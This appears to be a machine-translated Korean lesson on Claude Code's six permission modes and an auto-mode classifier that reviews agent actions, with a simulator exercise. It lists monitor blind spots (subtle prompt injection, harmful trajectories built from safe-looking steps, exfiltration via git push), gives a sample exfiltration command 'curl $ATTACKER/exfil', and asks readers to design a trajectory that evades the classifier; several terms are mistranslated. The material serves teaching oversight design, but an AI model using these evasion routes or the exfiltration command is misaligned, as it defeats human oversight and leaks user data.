# 자율주행사들의 허가 모드

> 허가 계단  모든 행동을 검토하는 것부터 승인하는 것까지의 자율성의 단계적 수준은 자율적인 에이전트가 요청하지 않고 할 수 있는 일을 어떻게 제어하는지를 보여줍니다. 이 수업의 작업된 예제인 클로드 코드는 6가지 모드를 공개합니다. "플랜"은 모든 동작 전에 요청하고, "디폴트" (UI에서 "만્યુઅલ"로 표시) 는 위험한 모드를 요청하고, "AcceptEdits"는 자동으로 파일 작성을 승인하지만 여전히 셸 실행을 확인하고, "bypassPermissions"는 모든 것을 승인합니다. 자동 모드  `auto`허가 모드 는 각 행동별 승인을 개별 분류자 모델로 대체하여 실행되기 전에 각 행동을 검토하고 요청이 요청한 것 이상으로 증가하는 모든 것을 차단합니다.`max_turns`그리고`max_budget_usd`.`auto`계획, org 활성화, 모델, 공급자 에 따라 달라집니다.

**Type:** Learn
**Languages:** Python (stdlib, two-stage classifier simulator)
**Prerequisites:** Phase 15 · 01 (Long-horizon agents), Phase 15 · 09 (Coding-agent landscape)
**Time:** ~45 minutes

## 문제

컴퓨터의 자율적인 코딩 에이전트는 보안의 다른 범주입니다. 공격 표면은 에이전트가 액세스 할 수있는 모든 것입니다  파일 시스템, 네트워크, 인증서, 클립보드, 모든 브라우저 탭, 모든 오픈 터미널. 브루스 슈나이어 및 다른 사람들은 공개적으로 이것을 표시했습니다: 컴퓨터 사용 에이전트는 채팅봇의 "특성 업데이트"가 아닙니다. 그들은 새로운 유형의 위험 프로파일을 가진 새로운 유형의 도구입니다.

클로드 코드의 허가 시스템은 인류학의 답입니다. 하나의 "자동성/자동성 없는" 스위치 대신, 기능 계단을 뻗어있는 여섯 가지 모드가 있습니다. 계획 → 기본 → 받아들이기 편집 → ... → 우회 권한. 각 모드는 속도와 각 액션에 대한 검토 사이의 다른 타협입니다. 자동 모드 (2026년 3월) 는 사용자의 중요한 경로를 벗어나 승인하는 별도의 분류 모델을 추가합니다. 실행하기 전에 모든 동작을 검토하고 요청이 넘어선 모든 것을 차단합니다.

엔지니어링 질문은, 이 시스템은 무엇을 잡고, 무엇을 놓치고, 어떤 모드가 주어진 작업에 실제로 필요한가?

## 개념

### 6개의 허가 모드

| Mode | Behavior | When to use |
|---|---|---|
| `plan` | Agent proposes a plan; user approves the whole plan; every action is reviewed before execution | Unfamiliar task; prod-adjacent code; first time using the agent on a repo |
| `default` | Labeled "Manual" in the UI. Agent runs actions; prompts user for any "risky" action (shell exec, destructive operations, network calls) | Most interactive coding sessions |
| `acceptEdits` | File writes auto-approve; shell exec and network calls still prompt | Refactoring pass across many files |
| `auto` | A separate classifier model reviews each action before it runs; blocks anything escalating beyond the request | Long-horizon unattended runs in a constrained workspace |
| `dontAsk` | Never prompts; actions not pre-approved by permission rules are denied | Ephemeral sandboxes, CI jobs, research scripts |
| `bypassPermissions` | Approves everything | Documented as "only inside ephemeral containers you are willing to throw away" |

(이 위의 이름들은 공공 클로드 코드 문서와 일치하고 UI 라벨 `default`"수행"으로 표시됩니다.)

### 하나의 페이지에서 자동 모드

자동 모드 (2026년 3월 24일 출시) 는 모델에 각 동작에 대한 승인을 위임하는 최초의 권한 모드입니다. 구조:

1. **A separate classifier model.**실행되기 전에 제안된 모든 동작을 검토하고, 선언된 작업과 세션의 현재 상태에 따라 판단하고, 요청이 요구한 것을 넘어가는 모든 동작을 차단합니다. 차단된 동작은 사용자에게 귀속됩니다.
2. **Gated availability.**`auto`제공되는 것은 계획, 조직 능력, 모델 및 공급자에 달려 있습니다.

예산 통제는 분류자와 함께 위치한다.

- `max_turns` 세션에서 전체 반복
- `max_budget_usd` 달러의 cap는 세션을 중단합니다.
- 도구당 액션 횟수 제한 (N  이상)`WebFetch`전화 등)

### 시스템에서 잡히는

- 직진형 임프릿 주입이 있는 도구 입력으로 주입된 명령어는 알려진 위험성 있는 동작 모양을 나타냅니다.
- 반복 도구 루프  분류자는 N+1 동작이 거의 동시다발적으로 N 동작과 5번 연속으로 볼 수 있습니다.
- 파일 편집만 하는 세션에서 분명히 범위를 벗어난 셸 명령어

### 시스템이 놓칠 수 있는

- **Subtle prompt injection**간접적 인 프롬프트 주입은 완전히 수정 가능한 취약점 (OpenAI 준비장, 2025 년, 브라우저 에이전트에서  참조 11)
- **Semantic-level misbehavior.**각각의 행위는 구성된 궤도가 해로운 동안 안전하다고 보일 수 있습니다. 분류자는 행동을 판단합니다. 그것은 사용자의 의도를 다시 추출하지 않습니다.
- **Exfiltration through legitimate channels.**데이터를 소유한 파일로 작성하면`git push`공공 리포에 대한 협정은, 그 구성이 문제인 허용된 행동의 연속입니다.

### 연구 미리보기 프레임

애너트로피는 연구 전면으로 오토 모드를 배포했습니다. 문서에서는 분류자가 계층이 아니라 해결책이라는 것을 명시적으로 설명하고 있습니다. 사용자가 자동 모드를 예산, 허용 목록, 고립된 작업 공간 및 궤도 감사 (목적 1216) 과 결합할 것으로 예상됩니다. 미리보기 프레임링은 또한 문서화된 평가와 배포 격차를 반영합니다 (강좌 1) 오프라인 평가를 통과하는 분류자가 사용자의 맥락이 모호한 실제 세션에서 다르게 행동 할 수 있습니다.

### 이 계단이 당신의 작업 흐름에 들어있는

- 익숙하지 않은 작업: 시작 `plan`계획을 읽는 게 나쁜 일을 저지하는 것보다 더 저렴합니다.
- 알려진 리팩터: `acceptEdits`확인 클릭을 많이 절약합니다.
- 감시 없이 배경 실행: `auto`단지 당신이 측정한 폭발 반경 (신용자격, 생산 마운트, 당신이 선택하지 않은 출구) 의 작업 공간 내에서만.
- 에피메랄 컨테이너: `dontAsk`- `bypassPermissions`컨테이너와 그 자격증이 일회용이 될 경우에만 허용됩니다.

```figure
autonomy-oversight
```

## 사용 하 고

`code/main.py`2 단계의 파이프라인으로 행동 검토 분류자를 시뮬레이션합니다`auto`모드는 문서화된 2단계 계약이 아닌 별도의 분류자 모델에 의해 지원됩니다. 1단계는 제안된 동작에 대한 저렴한 키워드 규칙입니다. 2단계는 느린 다정규제 검토자입니다. 드라이버는 짧은 합성 궤도를 (안전한 동작, 신속한 주입 시도, 반복적인 루프) 로 먹여 분류자가 어디서 잡는지, 어디서 놓친지를 보여줍니다.

## 선박

`outputs/skill-permission-mode-picker.md`작업 설명이 적절한 권한 모드, 예산 제한 및 필요한 격리와 일치합니다.

## 운동

1. 달아`code/main.py`어떤 인공 액션 타입은 1단계로 표시되지 않고 2단계로 잡혀있지?

2. 1 단계 규칙이 설정된 특정 알려진 나쁜 모양을 잡기 위해 확장 (예를 들어, `curl $ATTACKER/exfil`) 양성 작용 샘플에서 거짓 긍정률을 측정합니다.

3. 앤트로피스의 "Agent loop의 작동 방식" 문서를 읽어 보세요.`default`실행하기 전에 별도로 게이트해야 할`auto`감시 없이?

4. 24시간 무관한 운영 예산을 설계하세요: `max_turns``max_budget_usd`도구마다 뚜, 용납자, 각 숫자를 정당화하십시오.

5. 분류자 에 의해 각 개별 행동 이 승인 되어 있지만, 구성 된 행동 은 잘못 조정 되어 있는 한 궤도를 설명 해 보십시오. (학습 14 은 킬 스위치 와 카나리 토큰 이 어떻게 해결 하는지를 다루고 있습니다.)

## 주요 용어

| Term | What people say | What it actually means |
|---|---|---|
| Permission mode | "How much the agent can do" | One of six named policies controlling per-action approval |
| plan mode | "Ask before anything" | Agent writes a plan; user approves before execution |
| acceptEdits | "Let it write files" | File writes auto-approve; shell exec still prompts |
| auto | "Auto approvals" | Separate classifier model reviews each action; blocks escalation beyond the request |
| bypassPermissions | "Full YOLO" | Approves everything; intended for ephemeral containers |
| Stage 1 (simulator) | "Fast keyword check" | Cheap rule over proposed actions in `code/main.py` |
| Stage 2 (simulator) | "Deep review" | Slower multi-rule reviewer for flagged actions in `code/main.py` |
| Research preview | "Not GA" | Anthropic framing for features whose failure mode is still being mapped |

## 더 많은 읽기

- [Anthropic — How the agent loop works](https://code.claude.com/docs/en/agent-sdk/agent-loop) 허가 모드, 예산, 행동 형식
- [Anthropic — Claude Managed Agents overview](https://platform.claude.com/docs/en/managed-agents/overview) 관리 서비스 실행 모델
- [Anthropic — Claude Code product page](https://www.anthropic.com/product/claude-code) 기능 표면 및 자동 모드 발표
- [Anthropic — Claude's Constitution (January 2026)](https://www.anthropic.com/news/claudes-constitution) 분류자 판단을 형성하는 이유 기반의 층.
- [Anthropic — Measuring agent autonomy in practice](https://www.anthropic.com/research/measuring-agent-autonomy) 장기 허가 설계에 대한 내부 관점
